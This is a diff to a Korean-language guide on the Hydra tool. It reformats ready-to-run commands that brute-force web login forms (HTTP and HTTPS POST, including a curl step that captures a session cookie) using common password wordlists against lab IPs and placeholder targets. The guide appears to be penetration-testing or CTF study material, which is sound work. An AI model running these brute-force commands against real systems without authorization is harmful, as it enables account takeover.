@@ -91,9 +91,7 @@ username=test&password=test2&s_mod=login&s_pg=index
 조립 결과:
 
 ```bash
-hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
-  -t 16 -f 192.168.110.101 http-post-form \
-  "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong"
+hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 16 -f 192.168.110.101 http-post-form "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong"
 ```
 
 - `test2` 자리를 `^PASS^`로 치환하고, 고정값(hidden 필드)은 그대로 둔다
@@ -108,8 +106,7 @@ curl -s -c c.txt -o /dev/null -w "%{http_code}\n" http://<대상>/login/
 COOKIE=$(grep ISPCSESS c.txt | awk '{print $7}')
 
 # 3) H= 옵션으로 쿠키 헤더 추가
-hydra -l admin -P pass.txt -t 16 -f <대상> http-post-form \
-  "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong:H=Cookie:\ ISPCSESS=$COOKIE"
+hydra -l admin -P pass.txt -t 16 -f <대상> http-post-form "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong:H=Cookie:\ ISPCSESS=$COOKIE"
 ```
 
 - `-c c.txt`는 쿠키 저장(-b c.txt는 읽어서 요청에 실기)
@@ -118,8 +115,7 @@ hydra -l admin -P pass.txt -t 16 -f <대상> http-post-form \
 ### HTTPS 로그인 폼
 
 ```bash
-hydra -l admin -P pass.txt <대상> https-post-form \
-  "/login:username=^USER^&password=^PASS^:F=failed"
+hydra -l admin -P pass.txt <대상> https-post-form "/login:username=^USER^&password=^PASS^:F=failed"
 ```
 
 - 443은 `http-post-form`이 아니라 `https-post-form`
@@ -184,8 +180,7 @@ hydra -l admin -P pass.txt -s 2222 192.168.1.5 ssh
 ### 4. HTTP POST 로그인 크래킹
 
 ```bash
-hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form \
-"/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
+hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
 
 hydra -l molly -P rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
